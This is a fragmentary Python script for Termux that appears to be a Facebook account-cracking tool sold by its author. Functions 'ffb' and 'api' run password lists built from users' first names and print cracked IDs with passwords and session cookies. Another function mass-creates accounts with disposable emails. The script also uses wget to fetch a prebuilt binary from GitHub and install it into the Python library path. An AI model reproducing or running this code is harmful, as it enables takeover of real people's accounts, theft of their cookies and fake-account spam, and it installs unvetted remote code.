...
try:
	...
	if arch == '32bit':
		os.system("wget https://github.com/farhanaliofficial/pycurl/raw/main/32bit/pycurl.cpython-311.so")
		...
		os.system("wget https://github.com/farhanaliofficial/pycurl/raw/main/64bit/pycurl.cpython-311.so")
		os.system("mv pycurl.cpython-311.so /data/data/com.termux/files/usr/lib/python3.11/")
	else:
...
██████  ██   ██ ███████ ██   ██ ██      ██ 
               ...
               {BLUE} X {RED} SURKHETI {WHITE}

\t[×]Developed By DHIRAJ DHIRAJ {EXTRA} (USMII)
{WHITE}[•] AUTHOR       : DHIRAJ
{WHITE}[•] STYLE           : LATER
{WHITE}[•] WhatsApp          : +977 9869990242
[•] Facebook       : DHIRAJ DHIRAJ 
[•] Version            : {RED}13.5
{WHITE}[•] YouTube         : NUX 777

{WHITE}{eqs()}
\33[37;41m\tWelcome x To x INDRA x DHIRAJ x Tool\33[0;m
{WHITE}{eqs()}"""
...
def menu():
	...
	try:
		#approval()
		clear()
		print("YOUR KEY : HPP768HOMP7790")
		print("PLEASE BUY THIS COMMAND TO CONTINUE")
		linex()
		xd =(' BEST COMMAND OF ALL TIME #ROOT CKR')
...
def ffb(ids,names,passlist):
	...
	try:
		sys.stdout.write('\r\r\033[1;37m [USMII-RUNING-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		try:
			fn = names.split(' ')[0]
		except:
			fn = names
...
def api(ids,names,passlist):
	global oks, loop, cps, twf
	sys.stdout.write('\r\r\033[1;37m [USMII-RUNING-M2 ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	try:
		try:
			fn = names.split(' ')[0]
		except:
...
def Crreate():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [USMI-CREATE] \033[1;32mOK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                print("\r\r\033[1;32m [USMI-CP] "+uid+'|'+pas+'|'+coki)
                cp+=1
                pass
                 ...
                 print("\r\r\033[1;32m [USMI-OK] "+uid+'|'+pas+'|'+coki)
                 ok+=1
